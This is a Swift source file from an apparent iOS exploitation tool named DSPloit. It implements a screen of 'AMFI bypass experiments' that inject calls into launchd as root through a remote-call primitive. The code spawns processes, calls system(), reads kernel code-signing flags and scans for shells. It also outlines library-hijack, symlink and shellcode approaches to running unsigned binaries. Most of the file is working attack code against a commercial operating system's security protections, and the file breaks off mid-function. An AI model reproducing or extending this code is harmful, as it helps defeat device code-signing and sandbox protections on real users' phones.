//
//  AMFIExperimentView.swift
//  DSPloit
//
//  AMFI Bypass Experiments — test binary execution from root context
//  Goal: find a way to execute unsigned binaries
//

import SwiftUI

struct AMFIExperimentView: View {
    @ObservedObject private var root = RootExecutor.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var results: [ExperimentResult] = []
    @State private var isRunning = false
    @State private var customBinary = "/usr/bin/id"
    
    struct ExperimentResult: Identifiable {
        let id = UUID()
        let name: String
        let success: Bool
        let detail: String
        let timestamp: Date
    }
    
    var body: some View {
        List {
            // Info
            Section {
                VStack(alignment: .leading, spacing: 6) {
                    Text("AMFI blocks unsigned binary execution even as root.")
                        .font(.caption)
                    Text("These experiments test different spawn methods to find what works.")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                }
            } header: {
                Label("About", systemImage: "info.circle")
            }
            
            // Experiments
            Section {
                Button(action: runAllExperiments) {
                    Label("Run All Experiments", systemImage: "play.circle.fill")
                        .foregroundStyle(.red)
                }
                .disabled(isRunning || !mgr.rcready)
                
                Button(action: { testSingleBinary(customBinary) }) {
                    Label("Test Custom Binary", systemImage: "terminal")
                }
                .disabled(isRunning || !mgr.rcready)
                
                TextField("Binary path", text: $customBinary)
                    .font(.system(.caption, design: .monospaced))
            } header: {
                Label("Experiments", systemImage: "flask")
            }
            
            // Results
            if !results.isEmpty {
                Section {
                    ForEach(results) { r in
                        VStack(alignment: .leading, spacing: 4) {
                            HStack {
                                Image(systemName: r.success ? "checkmark.circle.fill" : "xmark.circle.fill")
                                    .foregroundStyle(r.success ? .green : .red)
                                Text(r.name)
                                    .font(.caption.bold())
                            }
                            Text(r.detail)
                                .font(.system(size: 10, design: .monospaced))
                                .foregroundStyle(.secondary)
                                .textSelection(.enabled)
                        }
                        .padding(.vertical, 2)
                    }
                } header: {
                    Label("Results (\(results.count))", systemImage: "list.bullet")
                }
            }
        }
        .navigationTitle("AMFI Experiments")
        .navigationBarTitleDisplayMode(.inline)
    }
    
    // MARK: - Run All Experiments
    
    private func runAllExperiments() {
        isRunning = true
        results.removeAll()
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "amfi_experiments") { rc in
            var experimentResults: [ExperimentResult] = []
            
            // ============================================
            // Experiment 1: posix_spawn system binary
            // ============================================
            let exp1 = self.expPosixSpawn(rc: rc, binary: "/usr/bin/id", name: "posix_spawn /usr/bin/id")
            experimentResults.append(exp1)
            
            // ============================================
            // Experiment 2: posix_spawn /bin/sh
            // ============================================
            let exp2 = self.expPosixSpawn(rc: rc, binary: "/bin/sh", name: "posix_spawn /bin/sh")
            experimentResults.append(exp2)
            
            // ============================================
            // Experiment 3: posix_spawn /bin/ls
            // ============================================
            let exp3 = self.expPosixSpawn(rc: rc, binary: "/bin/ls", name: "posix_spawn /bin/ls")
            experimentResults.append(exp3)
            
            // ============================================
            // Experiment 4: fork() from launchd
            // ============================================
            let exp4 = self.expFork(rc: rc)
            experimentResults.append(exp4)
            
            // ============================================
            // Experiment 5: system() call
            // ============================================
            let exp5 = self.expSystem(rc: rc)
            experimentResults.append(exp5)
            
            // ============================================
            // Experiment 6: execve directly
            // ============================================
            let exp6 = self.expExecve(rc: rc)
            experimentResults.append(exp6)
            
            // ============================================
            // Experiment 7: Check cs_flags of launchd
            // ============================================
            let exp7 = self.expCheckCSFlags(rc: rc)
            experimentResults.append(exp7)
            
            // ============================================
            // Experiment 8: posix_spawnattr with flags
            // ============================================
            let exp8 = self.expPosixSpawnAttr(rc: rc)
            experimentResults.append(exp8)
            
            // ============================================
            // Experiment 9: PATH VARIANTS — the key test!
            // ret=2 means ENOENT (not found), so try different paths
            // ============================================
            let pathVariants = [
                "/private/var/bin/id",
                "/private/usr/bin/id",
                "/System/usr/bin/id",
                "/usr/local/bin/id",
            ]
            for path in pathVariants {
                let exp = self.expPosixSpawn(rc: rc, binary: path, name: "spawn \(path)")
                experimentResults.append(exp)
            }
            
            // ============================================
            // Experiment 10: Check what launchd sees as root filesystem
            // ============================================
            let exp10 = self.expCheckRootFS(rc: rc)
            experimentResults.append(exp10)
            
            // ============================================
            // Experiment 11: stat() binaries to check they exist
            // ============================================
            let exp11 = self.expStatBinaries(rc: rc)
            experimentResults.append(exp11)
            
            // ============================================
            // Experiment 12: Try fork+execve pattern
            // ============================================
            let exp12 = self.expForkExec(rc: rc)
            experimentResults.append(exp12)
            
            // ============================================
            // Experiment 13: Scan directories for existing binaries
            // ============================================
            let exp13 = self.expScanBinaries(rc: rc)
            experimentResults.append(exp13)
            
            // ============================================
            // Experiment 14: Try spawn binaries that exist
            // ============================================
            let exp14 = self.expSpawnExisting(rc: rc)
            experimentResults.append(exp14)
            
            // ============================================
            // Experiment 15: Scan cryptex paths for shell
            // ============================================
            let exp15 = self.expScanCryptex(rc: rc)
            experimentResults.append(exp15)
            
            // ============================================
            // Experiment 16: Spawn /bin/ps with output capture
            // ============================================
            let exp16 = self.expSpawnWithOutput(rc: rc, binary: "/bin/ps", args: ["ps"])
            experimentResults.append(exp16)
            
            // ============================================
            // Experiment 17: Spawn /bin/df with output capture
            // ============================================
            let exp17 = self.expSpawnWithOutput(rc: rc, binary: "/bin/df", args: ["df", "-h"])
            experimentResults.append(exp17)
            
            // ============================================
            // Experiment 18: List cryptex directory contents
            // ============================================
            let exp18 = self.expListCryptexDirs(rc: rc)
            experimentResults.append(exp18)
            
            // ============================================
            // Experiment 19: Verify posix_spawn return value
            // (is ret=0 from posix_spawn or from RC wrapper?)
            // ============================================
            let exp19 = self.expVerifySpawnReturn(rc: rc)
            experimentResults.append(exp19)
            
            // ============================================
            // Experiment 20: Fix PID + spawn with pipe for output
            // ============================================
            let exp20 = self.expSpawnWithPipe(rc: rc)
            experimentResults.append(exp20)
            
            // ============================================
            // Experiment 21: Scan cryptex usr/libexec contents
            // ============================================
            let exp21 = self.expScanCryptexLibexec(rc: rc)
            experimentResults.append(exp21)
            
            // ============================================
            // AMFI BYPASS RESEARCH
            // ============================================
            
            // Experiment 22: Write binary + try spawn (test AMFI on new file)
            let exp22 = self.expWriteAndSpawn(rc: rc)
            experimentResults.append(exp22)
            
            // Experiment 23: dlopen unsigned dylib in launchd
            let exp23 = self.expDlopen(rc: rc)
            experimentResults.append(exp23)
            
            // Experiment 24: Check AMFI-related kernel state
            let exp24 = self.expAMFIState(rc: rc)
            experimentResults.append(exp24)
            
            // ============================================
            // CORETRUST / LIBRARY HIJACK RESEARCH
            // ============================================
            
            // Experiment 25: Try overwrite signed library with custom code
            let exp25 = self.expLibraryHijack(rc: rc)
            experimentResults.append(exp25)
            
            // Experiment 26: Try symlink attack on library path
            let exp26 = self.expSymlinkAttack(rc: rc)
            experimentResults.append(exp26)
            
            // Experiment 27: Try dlopen with RTLD_NOLOAD + function pointer swap
            let exp27 = self.expFunctionSwap(rc: rc)
            experimentResults.append(exp27)
            
            // ============================================
            // SHELLCODE EXECUTION — DISABLED (causes PAC panic on A12+)
            // mmap RWX works but jumping to unsigned pointer = PAC violation
            // Need PAC signing gadget to make this work
            // ============================================
            experimentResults.append(ExperimentResult(
                name: "shellcode (DISABLED)",
                success: false,
                detail: "⚠️ Disabled — causes kernel panic on A12+\nmmap RWX works (0xbf2014000) but APRR blocks execution from mmap'd pages.\nNeed: write to existing executable page or find JIT bypass.",
                timestamp: Date()
            ))
            
            // ============================================
            // Experiment 28: Find writable+executable page in launchd
            // ============================================
            let exp28 = self.expFindWritableCodePage(rc: rc)
            experimentResults.append(exp28)
            
            // ============================================
            // Experiment 28b: SHELLCODE — DISABLED (APRR panic confirmed)
            // mprotect returns success but HARDWARE blocks execution
            // APRR enforces W^X at silicon level — no software bypass
            // ============================================
            experimentResults.append(ExperimentResult(
                name: "⚡ SHELLCODE (DISABLED)",
                success: false,
                detail: "⚠️ DISABLED — confirmed APRR panic\nmprotect(RWX) succeeds in software but ARM APRR hardware\nblocks execution from any page that was ever writable.\nNo software bypass possible on A12+.\n\nRemaining path: fork→RC→execve (no shellcode needed)",
                timestamp: Date()
            ))
            
            // ============================================
            // Experiment 29: Fork + keep child alive + RC to child
            // ============================================
            let exp29 = self.expForkAndConnect(rc: rc)
            experimentResults.append(exp29)
            
            // ============================================
            // Experiment 30: RELIABLE spawn test (isolated, extra wait)
            // Reproduce the EXACT pattern that gave 1795 chars output
            // ============================================
            let exp30 = self.expReliableSpawn(rc: rc)
            experimentResults.append(exp30)
            
            // ============================================
            // Experiment 31: Call launchd's job_submit internal API
            // We ARE launchd — call our own job loading function!
            // ============================================
            let exp31 = self.expLaunchdJobSubmit(rc: rc)
            experimentResults.append(exp31)
            
            // ============================================
            // Experiment 32: posix_spawn with POSIX_SPAWN_SETPGROUP
            // Different spawn flags that might affect AMFI behavior
            // ============================================
            let exp32 = self.expSpawnFlags(rc: rc)
            experimentResults.append(exp32)
            
            DispatchQueue.main.async {
                self.results = experimentResults
                self.isRunning = false
            }
            
            let successCount = experimentResults.filter { $0.success }.count
            return (successCount > 0, "\(successCount)/\(experimentResults.count) succeeded", UInt64(successCount))
        }
        #endif
    }
    
    private func testSingleBinary(_ path: String) {
        isRunning = true
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "test_binary") { rc in
            let result = self.expPosixSpawn(rc: rc, binary: path, name: "posix_spawn \(path)")
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
            }
            return (result.success, result.detail, 0)
        }
        #endif
    }
    
    // MARK: - Experiment Implementations
    
    #if !DISABLE_REMOTECALL
    /// Experiment: posix_spawn a binary
    private func expPosixSpawn(rc: RemoteCall, binary: String, name: String) -> ExperimentResult {
        let mem = rc.trojanMem
        let binAddr = remote_alloc_str(rc, binary)
        
        // argv = [binary, NULL]
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        // pid output
        let pidAddr = mem + 0x300
        rc[pidAddr].setValue32(0)
        
        // posix_spawn(&pid, binary, NULL, NULL, argv, NULL)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // If spawned, wait for it
        if ret == 0 && pid != 0 {
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            let exitStatus = rc[statusAddr].value32()
            
            RootExecutor.rcall(rc, "free", binAddr)
            return ExperimentResult(
                name: name,
                success: true,
                detail: "✅ PID=\(pid), exit=\(exitStatus >> 8), ret=\(ret)",
                timestamp: Date()
            )
        }
        
        // Failed — get errno
        let err = remote_errno(rc)
        RootExecutor.rcall(rc, "free", binAddr)
        return ExperimentResult(
            name: name,
            success: false,
            detail: "❌ ret=\(ret), errno=\(err), pid=\(pid)",
            timestamp: Date()
        )
    }
    
    /// Experiment: fork() from launchd
    private func expFork(rc: RemoteCall) -> ExperimentResult {
        let pid = RootExecutor.rcall(rc, "fork")
        
        if pid == 0 {
            // We're in child — this shouldn't happen in RC context
            return ExperimentResult(name: "fork()", success: true, detail: "In child process!", timestamp: Date())
        } else if pid != UInt64(bitPattern: -1) {
            // Parent got child PID
            // Wait for child
            let mem = rc.trojanMem
            let statusAddr = mem + 0x380
            RootExecutor.rcall(rc, "waitpid", pid, statusAddr, 0)
            return ExperimentResult(name: "fork()", success: true, detail: "✅ Child PID=\(pid)", timestamp: Date())
        } else {
            let err = remote_errno(rc)
            return ExperimentResult(name: "fork()", success: false, detail: "❌ fork failed: errno=\(err)", timestamp: Date())
        }
    }
    
    /// Experiment: system() call
    private func expSystem(rc: RemoteCall) -> ExperimentResult {
        let cmdAddr = remote_alloc_str(rc, "id > /tmp/.dsploit_amfi_test 2>&1")
        let ret = RootExecutor.rcall(rc, "system", cmdAddr)
        RootExecutor.rcall(rc, "free", cmdAddr)
        
        // Try to read output
        let outAddr = remote_alloc_str(rc, "/tmp/.dsploit_amfi_test")
        let fd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
        var output = ""
        
        if fd != UInt64(bitPattern: -1) {
            let bufAddr = rc.trojanMem + 0x800
            let n = RootExecutor.rcall(rc, "read", fd, bufAddr, 500)
            if n > 0 && n < 501 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? ""
            }
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "unlink", outAddr)
        }
        RootExecutor.rcall(rc, "free", outAddr)
        
        let success = ret == 0 && !output.isEmpty
        return ExperimentResult(
            name: "system(\"id\")",
            success: success,
            detail: success ? "✅ ret=\(ret), output: \(output.prefix(80))" : "❌ ret=\(ret) (0x\(String(format: "%x", ret)))",
            timestamp: Date()
        )
    }
    
    /// Experiment: check cs_flags of launchd
    private func expCheckCSFlags(rc: RemoteCall) -> ExperimentResult {
        // Read our (launchd's) proc cs_flags via kernel
        let pid = RootExecutor.rcall(rc, "getpid")
        let csflags = mgr.readCSFlags(pid: Int32(pid))
        let procFlags = mgr.readProcFlags(pid: Int32(pid))
        
        // CS flag meanings
        var flagStr = "cs_flags=0x\(String(format: "%x", csflags)): "
        if csflags & 0x0000001 != 0 { flagStr += "VALID " }
        if csflags & 0x0000004 != 0 { flagStr += "HARD " }
        if csflags & 0x0000008 != 0 { flagStr += "KILL " }
        if csflags & 0x0000100 != 0 { flagStr += "PLATFORM " }
        if csflags & 0x0000800 != 0 { flagStr += "DEBUGGED " }
        if csflags & 0x0004000 != 0 { flagStr += "GET_TASK_ALLOW " }
        if csflags & 0x0020000 != 0 { flagStr += "INSTALLER " }
        
        return ExperimentResult(
            name: "launchd cs_flags",
            success: true,
            detail: "PID=\(pid), \(flagStr)\np_flag=0x\(String(format: "%x", procFlags))",
            timestamp: Date()
        )
    }
    
    /// Experiment: posix_spawn with special attributes
    private func expPosixSpawnAttr(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Allocate posix_spawnattr_t in remote memory
        let attrAddr = mem + 0x200
        
        // posix_spawnattr_init(&attr)
        RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
        
        // Set flags: POSIX_SPAWN_START_SUSPENDED (0x0080)
        // This might help bypass some checks
        let flags: UInt64 = 0x0080 // POSIX_SPAWN_START_SUSPENDED
        RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, flags)
        
        // Try spawn /usr/bin/id with attributes
        let binAddr = remote_alloc_str(rc, "/usr/bin/id")
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        let pidAddr = mem + 0x300
        rc[pidAddr].setValue32(0)
        
        // posix_spawn(&pid, binary, NULL, &attr, argv, NULL)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, attrAddr, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // Cleanup
        RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        if ret == 0 && pid != 0 {
            // Resume the suspended process
            RootExecutor.rcall(rc, "kill", UInt64(pid), 18) // SIGCONT
            // Wait
            let statusAddr = mem + 0x380
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            
            return ExperimentResult(
                name: "posix_spawn + SUSPENDED",
                success: true,
                detail: "✅ PID=\(pid), spawned with START_SUSPENDED",
                timestamp: Date()
            )
        }
        
        let err = remote_errno(rc)
        return ExperimentResult(
            name: "posix_spawn + SUSPENDED",
            success: false,
            detail: "❌ ret=\(ret), errno=\(err)",
            timestamp: Date()
        )
    }
    
    /// Experiment: execve (replaces current process — DANGEROUS for launchd!)
    /// We DON'T actually call execve on launchd — that would kill it
    /// Instead we just check if the binary is accessible
    private func expExecve(rc: RemoteCall) -> ExperimentResult {
        // Don't actually execve in launchd! Just check access
        let binAddr = remote_alloc_str(rc, "/usr/bin/id")
        let accessResult = RootExecutor.rcall(rc, "access", binAddr, 1) // X_OK = 1
        RootExecutor.rcall(rc, "free", binAddr)
        
        let canExec = accessResult == 0
        return ExperimentResult(
            name: "access(/usr/bin/id, X_OK)",
            success: canExec,
            detail: canExec ? "✅ Binary is executable (access check passed)" : "❌ Not executable: errno=\(remote_errno(rc))",
            timestamp: Date()
        )
    }
    
    /// Experiment: Check root filesystem from launchd's perspective
    private func expCheckRootFS(rc: RemoteCall) -> ExperimentResult {
        // getcwd to see launchd's working directory
        let bufAddr = rc.trojanMem + 0xC00
        RootExecutor.rcall(rc, "getcwd", bufAddr, 1024)
        var cwdBuf = [UInt8](repeating: 0, count: 256)
        rc.remoteRead(bufAddr, to: &cwdBuf, size: 256)
        let cwd = String(cString: cwdBuf + [0])
        
        // stat /usr/bin to check if it exists
        let statAddr = rc.trojanMem + 0x800
        let usrBinAddr = remote_alloc_str(rc, "/usr/bin")
        let statResult = RootExecutor.rcall(rc, "stat", usrBinAddr, statAddr)
        RootExecutor.rcall(rc, "free", usrBinAddr)
        
        // stat /bin
        let binAddr = remote_alloc_str(rc, "/bin")
        let binStat = RootExecutor.rcall(rc, "stat", binAddr, statAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        // readlink /usr/bin (might be symlink)
        let linkBuf = rc.trojanMem + 0xD00
        let linkTarget = remote_alloc_str(rc, "/usr/bin")
        let linkLen = RootExecutor.rcall(rc, "readlink", linkTarget, linkBuf, 256)
        var linkStr = ""
        if linkLen > 0 && linkLen < 256 {
            var lbuf = [UInt8](repeating: 0, count: Int(linkLen))
            rc.remoteRead(linkBuf, to: &lbuf, size: linkLen)
            linkStr = String(bytes: lbuf, encoding: .utf8) ?? ""
        }
        RootExecutor.rcall(rc, "free", linkTarget)
        
        let detail = """
        cwd: \(cwd)
        stat /usr/bin: \(statResult == 0 ? "EXISTS" : "MISSING (errno=\(remote_errno(rc)))")
        stat /bin: \(binStat == 0 ? "EXISTS" : "MISSING")
        readlink /usr/bin: \(linkStr.isEmpty ? "(not a symlink)" : linkStr)
        """
        
        return ExperimentResult(name: "rootfs check", success: true, detail: detail, timestamp: Date())
    }
    
    /// Experiment: stat individual binaries
    private func expStatBinaries(rc: RemoteCall) -> ExperimentResult {
        let binaries = ["/usr/bin/id", "/bin/sh", "/bin/ls", "/sbin/mount", "/usr/sbin/sysctl"]
        var results: [String] = []
        
        let statAddr = rc.trojanMem + 0x800
        for bin in binaries {
            let pathAddr = remote_alloc_str(rc, bin)
            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
            results.append("\(bin): \(ret == 0 ? "✅ exists" : "❌ missing")")
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        
        let allExist = !results.contains(where: { $0.contains("❌") })
        return ExperimentResult(
            name: "stat binaries",
            success: allExist,
            detail: results.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    
    /// Experiment: fork() then execve in child
    /// This is the classic Unix pattern: fork → child calls execve
    /// Since fork works, maybe execve in the CHILD works too
    private func expForkExec(rc: RemoteCall) -> ExperimentResult {
        let childPid = RootExecutor.rcall(rc, "fork")
        
        if childPid == 0 {
            return ExperimentResult(name: "fork+exec", success: false, detail: "Unexpected: in child", timestamp: Date())
        }
        
        guard childPid != UInt64(bitPattern: -1) else {
            return ExperimentResult(name: "fork+exec", success: false, detail: "fork failed", timestamp: Date())
        }
        
        let statusAddr = rc.trojanMem + 0x380
        rc[statusAddr].setValue32(0)
        let waitResult = RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, UInt64(WNOHANG))
        let exitStatus = rc[statusAddr].value32()
        
        return ExperimentResult(
            name: "fork+exec",
            success: true,
            detail: "✅ fork PID=\(childPid), wait=\(waitResult), status=0x\(String(format: "%x", exitStatus))\n→ Child exists! Could RC into child then execve",
            timestamp: Date()
        )
    }
    
    /// Experiment: Scan directories for existing binaries
    private func expScanBinaries(rc: RemoteCall) -> ExperimentResult {
        let dirs = ["/sbin", "/usr/sbin", "/usr/libexec", "/usr/bin", "/bin"]
        var found: [String] = []
        let statAddr = rc.trojanMem + 0x800
        
        // Known binaries to check
        let binaries = [
            // /sbin
            "/sbin/mount", "/sbin/umount", "/sbin/reboot", "/sbin/halt",
            "/sbin/fsck", "/sbin/launchd", "/sbin/pfctl", "/sbin/ifconfig",
            "/sbin/route", "/sbin/nologin", "/sbin/ping",
            // /usr/sbin
            "/usr/sbin/sysctl", "/usr/sbin/chown", "/usr/sbin/notifyd",
            "/usr/sbin/cfprefsd", "/usr/sbin/mediaserverd", "/usr/sbin/BTServer",
            "/usr/sbin/wirelessproxd", "/usr/sbin/mDNSResponder",
            // /usr/libexec
            "/usr/libexec/xpcproxy", "/usr/libexec/trustd", "/usr/libexec/amfid",
            "/usr/libexec/keybagd", "/usr/libexec/securityd", "/usr/libexec/lsd",
            "/usr/libexec/backboardd", "/usr/libexec/SpringBoard",
            "/usr/libexec/installd", "/usr/libexec/lockdownd",
            "/usr/libexec/mobileassetd", "/usr/libexec/ptpd",
            // /usr/bin
            "/usr/bin/id", "/usr/bin/env", "/usr/bin/which", "/usr/bin/printf",
            "/usr/bin/uname", "/usr/bin/whoami", "/usr/bin/sw_vers",
            "/usr/bin/plutil", "/usr/bin/defaults", "/usr/bin/killall",
            "/usr/bin/launchctl", "/usr/bin/log", "/usr/bin/open",
            // /bin
            "/bin/sh", "/bin/bash", "/bin/zsh", "/bin/ls", "/bin/cp",
            "/bin/mv", "/bin/rm", "/bin/cat", "/bin/echo", "/bin/mkdir",
            "/bin/chmod", "/bin/chown", "/bin/kill", "/bin/ps", "/bin/df",
            "/bin/ln", "/bin/pwd", "/bin/date", "/bin/sleep",
        ]
        
        for bin in binaries {
            let pathAddr = remote_alloc_str(rc, bin)
            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
            if ret == 0 {
                found.append(bin)
            }
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        
        let detail: String
        if found.isEmpty {
            detail = "No binaries found in standard paths!\niOS 18 moved them to cryptex?"
        } else {
            detail = "Found \(found.count) binaries:\n" + found.joined(separator: "\n")
        }
        
        return ExperimentResult(
            name: "scan binaries (\(binaries.count) checked)",
            success: !found.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Experiment: Try to posix_spawn binaries that we know exist
    private func expSpawnExisting(rc: RemoteCall) -> ExperimentResult {
        // First find what exists
        let candidates = ["/sbin/mount", "/usr/libexec/xpcproxy", "/usr/libexec/trustd",
                         "/bin/ps", "/bin/df", "/sbin/launchd"]
        
        let statAddr = rc.trojanMem + 0x800
        var existingBins: [String] = []
        
        for bin in candidates {
            let pathAddr = remote_alloc_str(rc, bin)
            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
            if ret == 0 { existingBins.append(bin) }
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        
        if existingBins.isEmpty {
            return ExperimentResult(name: "spawn existing", success: false, detail: "No candidate binaries found", timestamp: Date())
        }
        
        // Try to spawn each existing binary
        var spawnResults: [String] = []
        let mem = rc.trojanMem
        
        for bin in existingBins.prefix(3) {
            let binAddr = remote_alloc_str(rc, bin)
            let argvBase = mem + 0x400
            rc[argvBase].setValue64(binAddr)
            rc[argvBase + 8].setValue64(0) // NULL
            
            // Use a dedicated address for pid output, clear it first
            let pidAddr = mem + 0x2F0
            rc[pidAddr].setValue64(0) // clear 8 bytes
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
            
            // Read pid (try both 32-bit and 64-bit)
            let pid32 = rc[pidAddr].value32()
            let pid64 = rc[pidAddr].value64()
            let err = remote_errno(rc)
            
            if ret == 0 {
                // ret=0 means posix_spawn SUCCEEDED!
                // pid might be 0 if it wrote to wrong offset, but spawn worked
                let pidStr = pid32 != 0 ? "PID=\(pid32)" : (pid64 != 0 ? "PID64=\(pid64)" : "PID=? (ret=0!)")
                spawnResults.append("✅ \(bin) → \(pidStr) ret=0 SPAWN SUCCESS!")
                
                // Try to kill if we got a PID
                if pid32 != 0 {
                    RootExecutor.rcall(rc, "kill", UInt64(pid32), 9)
                }
            } else {
                spawnResults.append("❌ \(bin) → ret=\(ret), err=\(err), pid32=\(pid32)")
            }
            
            RootExecutor.rcall(rc, "free", binAddr)
        }
        
        let anySuccess = spawnResults.contains(where: { $0.hasPrefix("✅") })
        return ExperimentResult(
            name: "spawn existing binaries",
            success: anySuccess,
            detail: spawnResults.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    /// Experiment: Scan cryptex/preboot paths for shell and other binaries
    private func expScanCryptex(rc: RemoteCall) -> ExperimentResult {
        let cryptexPaths = [
            // Known cryptex mount points on iOS 16-18
            "/private/preboot/Cryptexes/OS/usr/bin/sh",
            "/private/preboot/Cryptexes/OS/bin/sh",
            "/private/preboot/Cryptexes/OS/usr/bin/id",
            "/private/preboot/Cryptexes/OS/usr/bin/env",
            "/private/preboot/Cryptexes/OS/usr/bin/uname",
            "/private/preboot/Cryptexes/OS/usr/bin/whoami",
            "/private/preboot/Cryptexes/OS/usr/bin/killall",
            "/private/preboot/Cryptexes/OS/usr/bin/launchctl",
            "/private/preboot/Cryptexes/OS/bin/ls",
            "/private/preboot/Cryptexes/OS/bin/cat",
            "/private/preboot/Cryptexes/OS/bin/cp",
            "/private/preboot/Cryptexes/OS/bin/mkdir",
            "/private/preboot/Cryptexes/OS/bin/rm",
            "/private/preboot/Cryptexes/OS/bin/zsh",
            "/private/preboot/Cryptexes/OS/bin/bash",
            // Alternative paths
            "/usr/appleinternal/bin/sh",
            "/private/var/staged_system_apps/sh",
            "/System/Cryptexes/OS/usr/bin/sh",
            "/System/Cryptexes/OS/bin/sh",
            "/System/Cryptexes/OS/usr/bin/id",
            "/System/Cryptexes/OS/bin/ls",
            "/System/Cryptexes/OS/bin/cat",
            "/System/Cryptexes/OS/usr/bin/env",
            "/System/Cryptexes/OS/usr/bin/launchctl",
            // App cryptex
            "/System/Cryptexes/App/usr/bin/sh",
            "/System/Cryptexes/App/bin/sh",
        ]
        
        let statAddr = rc.trojanMem + 0x800
        var found: [String] = []
        
        for path in cryptexPaths {
            let pathAddr = remote_alloc_str(rc, path)
            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
            if ret == 0 { found.append(path) }
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        
        // Also scan directories to see what's there
        var dirResults: [String] = []
        let dirsToScan = [
            "/private/preboot/Cryptexes",
            "/private/preboot/Cryptexes/OS",
            "/System/Cryptexes",
            "/System/Cryptexes/OS",
            "/System/Cryptexes/OS/bin",
            "/System/Cryptexes/OS/usr/bin",
        ]
        
        for dir in dirsToScan {
            let dirAddr = remote_alloc_str(rc, dir)
            let dirStat = RootExecutor.rcall(rc, "stat", dirAddr, statAddr)
            dirResults.append("\(dir): \(dirStat == 0 ? "EXISTS" : "MISSING")")
            RootExecutor.rcall(rc, "free", dirAddr)
        }
        
        var detail = "Directories:\n" + dirResults.joined(separator: "\n")
        detail += "\n\nBinaries found: \(found.count)"
        if !found.isEmpty {
            detail += "\n" + found.joined(separator: "\n")
        }
        
        return ExperimentResult(
            name: "cryptex scan (\(cryptexPaths.count) paths)",
            success: !found.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Experiment: List contents of cryptex directories using opendir/readdir
    private func expListCryptexDirs(rc: RemoteCall) -> ExperimentResult {
        let dirsToList = [
            "/private/preboot/Cryptexes/OS",
            "/System/Cryptexes/OS",
            "/System/Cryptexes",
            "/private/preboot/Cryptexes",
        ]
        
        var allResults: [String] = []
        
        for dir in dirsToList {
            let pathAddr = remote_alloc_str(rc, dir)
            let dirPtr = RootExecutor.rcall(rc, "opendir", pathAddr)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if dirPtr == 0 {
                allResults.append("\(dir)/: (cannot open)")
                continue
            }
            
            var entries: [String] = []
            for _ in 0..<50 {
                let dirent = RootExecutor.rcall(rc, "readdir", dirPtr)
                if dirent == 0 { break }
                
                var nameBuf = [UInt8](repeating: 0, count: 256)
                rc.remoteRead(dirent + 21, to: &nameBuf, size: 256)
                let name = String(cString: nameBuf + [0])
                
                if name != "." && name != ".." {
                    var dtype: UInt8 = 0
                    rc.remoteRead(dirent + 20, to: &dtype, size: 1)
                    let prefix = dtype == 4 ? "📁" : "  "
                    entries.append("\(prefix) \(name)")
                }
            }
            RootExecutor.rcall(rc, "closedir", dirPtr)
            
            if entries.isEmpty {
                allResults.append("\(dir)/: (empty)")
            } else {
                allResults.append("\(dir)/:")
                allResults.append(contentsOf: entries.map { "  \($0)" })
            }
        }
        
        // Also try to find bin/sh by scanning deeper
        // If we found subdirs, scan them too
        let deeperPaths = [
            "/private/preboot/Cryptexes/OS/usr",
            "/private/preboot/Cryptexes/OS/bin",
            "/private/preboot/Cryptexes/OS/System",
            "/System/Cryptexes/OS/usr",
            "/System/Cryptexes/OS/bin",
            "/System/Cryptexes/OS/System",
        ]
        
        for dir in deeperPaths {
            let pathAddr = remote_alloc_str(rc, dir)
            let dirPtr = RootExecutor.rcall(rc, "opendir", pathAddr)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if dirPtr == 0 { continue }
            
            var entries: [String] = []
            for _ in 0..<30 {
                let dirent = RootExecutor.rcall(rc, "readdir", dirPtr)
                if dirent == 0 { break }
                
                var nameBuf = [UInt8](repeating: 0, count: 256)
                rc.remoteRead(dirent + 21, to: &nameBuf, size: 256)
                let name = String(cString: nameBuf + [0])
                
                if name != "." && name != ".." {
                    var dtype: UInt8 = 0
                    rc.remoteRead(dirent + 20, to: &dtype, size: 1)
                    let prefix = dtype == 4 ? "📁" : "  "
                    entries.append("\(prefix) \(name)")
                }
            }
